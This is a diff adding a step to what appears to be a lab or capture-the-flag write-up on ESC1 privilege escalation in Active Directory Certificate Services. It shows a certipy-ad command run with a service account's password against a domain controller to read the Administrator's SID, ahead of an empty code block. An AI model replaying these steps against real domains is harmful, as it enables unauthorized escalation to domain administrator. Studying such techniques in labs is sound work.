@@ -687,3 +687,23 @@ Looks like it might be vulnerable to ESC1
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication
 
+```python
+❯❯❯ certipy-ad account -u 'svc-pki@orion.local' -p 'Pki@Orion2026!' -dc-ip '10.0.0.5' -user 'administrator' read
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'Administrator':
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=orion,DC=local
+    name                                : Administrator
+    objectSid                           : S-1-5-21-285037524-3800758587-3641439792-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2026-10-03T15:10:16+00:00
+    whenChanged                         : 2026-10-15T18:42:50+00:00
+```
+
+First ill read the SID of the domain admin
+
+```python
+
+```
